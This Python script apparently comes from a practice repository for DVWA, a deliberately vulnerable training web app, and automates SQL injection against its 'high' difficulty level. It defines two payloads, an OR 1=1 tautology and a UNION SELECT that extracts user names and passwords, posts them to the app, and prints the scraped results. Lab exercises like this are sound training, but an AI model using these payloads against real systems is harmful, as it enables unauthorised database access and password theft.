#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from util import http_get, http_post

PAYLOADS = [
    "' OR 1=1 -- ",
    "' UNION SELECT first_name, password FROM users # "
]

# -----------------------

def sqli_high(base_url):
    global PAYLOADS

    print("==================================")
    print("[INFO] - SQLi high")    
    
    difficulty = "high"
    
    for payload in PAYLOADS:
        # -- request to change app state
        url = base_url + "/vulnerabilities/sqli/session-input.php"
        post_data = f"id={payload}&Submit=Submit"
        r = http_post(url, difficulty, data=post_data)

        # -- check if the input triggered an SQLi
        url = base_url + "/vulnerabilities/sqli/"
        r = http_get(url, difficulty)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})

        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                print(elem)
